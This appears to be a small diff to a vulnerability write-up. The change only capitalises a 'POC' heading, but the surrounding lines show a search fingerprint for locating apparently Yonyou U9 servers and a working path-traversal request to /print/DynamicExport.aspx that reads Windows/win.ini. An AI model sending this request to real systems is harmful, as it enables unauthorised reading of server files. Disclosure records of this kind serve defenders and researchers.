@@ -8,7 +8,7 @@
 (body="logo-u9.png" || body="/U9/css/")
 ```
 
-## poc
+## POC
 ```
 GET /print/DynamicExport.aspx?filePath=../../../../../../Windows/win.ini HTTP/1.1
 Host: [已模糊处理]
